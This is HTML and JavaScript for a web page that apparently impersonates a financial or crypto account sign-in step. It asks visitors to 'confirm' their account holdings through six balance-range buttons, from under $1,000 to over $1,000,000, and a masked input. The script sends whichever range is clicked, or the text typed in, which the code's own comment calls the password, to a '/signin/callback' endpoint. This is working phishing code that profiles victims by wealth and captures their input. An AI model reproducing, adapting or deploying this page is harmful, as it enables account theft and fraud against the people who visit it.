              ...
              <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 448px; width: 100%;">
                <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-4-_1w9a5m" style="width: 100%;">
                  <form novalidate="">
                    ...
                    <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-1-_9w3lns">Confirm estimated account holdings</h1>
                    <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-3-_1mvq9l2 ">
                      Confirm the last estimated holdings on your last account statement.</p>
                      
                    <div class="cds-1-_9w3lnscds-inputAreaContainerStyles-i1sndg40 cds-2-_1qjdqpv cds-1-_9w3lns cds-column-ci8mx7v cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_obadkb"> 
                        ...
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance1Button" name="balance1Button">
                                Under $1,000
                            </button>
                        </span>
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance2Button" name="balance2Button">
                                $1,000 - $9,999
                            </button>
                        </span>
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance3Button" name="balance3Button">
                                $10,000 - $99,999
                            </button>
                        </span>
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance4Button" name="balance4Button">
                                $100,000 - $249,999
                            </button>
                        </span>
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance5Button" name="balance5Button">
                                $250,000 - $999,999
                            </button>
                        </span>
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                        style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                            <button aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="1000-9999" 
                            style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: pointer;" 
                            tabindex="0" id="balance6Button" name="balance6Button">
                                Over $1,000,000
                            </button>
                        </span>
                    </div>
...
<script>
      ...
      if (icon) {
          icon.addEventListener('click', function() {
              if (icon.getAttribute('data-icon-name') === 'visibleInactive') {
                  ...
                  icon.textContent = ''; 
                  document.getElementById('account-holdings').type = 'text';
              } else {
                  icon.setAttribute('data-icon-name', 'visibleInactive');
                  icon.textContent = '';
                  document.getElementById('account-holdings').type = 'password';
              }
          });
      }
  });
  ...
  function handleDataSubmission(data) {
      fetch('/signin/callback', {
          ...
          body: `balance=${encodeURIComponent(data)}`
      })
  ...
  document.addEventListener('DOMContentLoaded', function() {
      const buttonConfigs = [
          { id: 'balance1Button', data: 'Under $1,000' },
          { id: 'balance2Button', data: '$1,000 - $9,999' },
          { id: 'balance3Button', data: '$10,000 - $99,999' },
          { id: 'balance4Button', data: '$100,000 - $249,999' },
          { id: 'balance5Button', data: '$250,000 - $999,999' },
          { id: 'balance6Button', data: 'Over $1,000,000' }
      ];
      ...
      buttonConfigs.forEach(function(buttonConfig) {
          ...
          if (button) {
              button.addEventListener('click', function(event) {
                  ...
                  handleDataSubmission(buttonConfig.data);  // Send custom data when the button is clicked
              });
          }
      });
  
      const passwordInput = document.getElementById('account-holdings');
  
      passwordInput.addEventListener('keypress', function(event) {
          if (event.key === 'Enter') {
              event.preventDefault();
              const password = passwordInput.value;
              handleDataSubmission(password);  // Send the password as data when "Enter" is pressed
          }
      });
  });
  </script>
